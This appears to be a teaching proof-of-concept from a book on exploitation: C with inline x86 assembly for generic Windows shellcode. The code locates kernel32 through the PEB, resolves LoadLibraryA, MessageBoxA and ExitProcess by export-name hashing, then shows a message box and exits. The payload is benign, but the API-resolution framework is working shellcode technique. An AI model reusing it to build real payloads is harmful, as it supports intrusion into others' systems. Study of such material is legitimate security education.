/*****************************************************************************
      To be the apostrophe which changed "Impossible" into "I'm possible"!
		
POC code of chapter 3.4 in book "Vulnerability Exploit and Analysis Technique"
 
file name	: shellcode_popup_general.c
author		: failwest  
date		: 2006.10.20
description	: can be run across OS platform and different patch version
				the code used to generate PE file and extract binary code   
Noticed		:  
version		: 1.0
E-mail		: failwest@gmail.com
		
	Only for educational purposes    enjoy the fun from exploiting :)
******************************************************************************/

int main()
{	
	_asm{
			nop
			nop
			
		
			
			nop
			nop
			nop
			CLD					; clear flag DF
			;store hash
			push 0x1e380a6a		;hash of MessageBoxA
			push 0x4fd18963		;hash of ExitProcess
			push 0x0c917432		;hash of LoadLibraryA
			mov esi,esp			; esi = addr of first function hash 
			lea edi,[esi-0xc]	; edi = addr to start writing function 

			

			; make some stack space
			xor ebx,ebx
			mov bh, 0x04 			 
			sub esp, ebx 
			


			
			; push a pointer to "user32" onto stack 
			mov bx, 0x3233 		; rest of ebx is null 
			push ebx 
			push 0x72657375 
			push esp 
			
			xor edx,edx


		; find base addr of kernel32.dll 
			mov ebx, fs:[edx + 0x30] 	; ebx = address of PEB 
			mov ecx, [ebx + 0x0c] 		; ecx = pointer to loader data 
			mov ecx, [ecx + 0x1c] 		; ecx = first entry in initialisation order list 
			mov ecx, [ecx] 				; ecx = second entry in list (kernel32.dll) 
			mov ebp, [ecx + 0x08] 		; ebp = base address of kernel32.dll 
			
						
		find_lib_functions: 
		
			lodsd 					; load next hash into al and increment esi 
			cmp eax, 0x1e380a6a		; hash of MessageBoxA - trigger 
									; LoadLibrary("user32") 
			jne find_functions 
			xchg eax, ebp 			; save current hash 
			call [edi - 0x8] 		; LoadLibraryA 
			xchg eax, ebp 			; restore current hash, and update ebp 
									; with base address of user32.dll 
			
			
		find_functions: 
			pushad 						; preserve registers 
			mov eax, [ebp + 0x3c]		; eax = start of PE header 
			mov ecx, [ebp + eax + 0x78]	; ecx = relative offset of export table 
			add ecx, ebp 				; ecx = absolute addr of export table 
			mov ebx, [ecx + 0x20] 		; ebx = relative offset of names table 
			add ebx, ebp 				; ebx = absolute addr of names table 
			xor edi, edi 				; edi will count through the functions 

		next_function_loop: 
			inc edi 					; increment function counter 
			mov esi, [ebx + edi * 4] 	; esi = relative offset of current function name 
			add esi, ebp 				; esi = absolute addr of current function name 
			cdq 						; dl will hold hash (we know eax is small) 
			
		hash_loop: 
			movsx eax, byte ptr[esi]
			cmp al,ah
			jz compare_hash
			ror edx,7
			add edx,eax
			inc esi
			jmp hash_loop

		compare_hash:	
			cmp edx, [esp + 0x1c] 		; compare to the requested hash (saved on stack from pushad) 
			jnz next_function_loop 
			
		 
			mov ebx, [ecx + 0x24] 		; ebx = relative offset of ordinals table 
			add ebx, ebp 				; ebx = absolute addr of ordinals table 
			mov di, [ebx + 2 * edi] 	; di = ordinal number of matched function 
			mov ebx, [ecx + 0x1c] 		; ebx = relative offset of address table 
			add ebx, ebp 				; ebx = absolute addr of address table 
			add ebp, [ebx + 4 * edi] 	; add to ebp (base addr of module) the 
										; relative offset of matched function 
			xchg eax, ebp 				; move func addr into eax 
			pop edi 					; edi is last onto stack in pushad 
			stosd 						; write function addr to [edi] and increment edi 
			push edi 
			popad					; restore registers 
					 				; loop until we reach end of last hash 
			cmp eax,0x1e380a6a
			jne find_lib_functions 

		function_call:
			xor ebx,ebx
			push ebx			// cut string
			push 0x74736577
			push 0x6C696166		//push failwest
			mov eax,esp			//load address of failwest
			push ebx	
			push eax
			push eax
			push ebx
			call [edi - 0x04] ; //call MessageboxA
			push ebx
			call [edi - 0x08] ; // call ExitProcess
			nop
			nop
			nop
			nop
	}
}
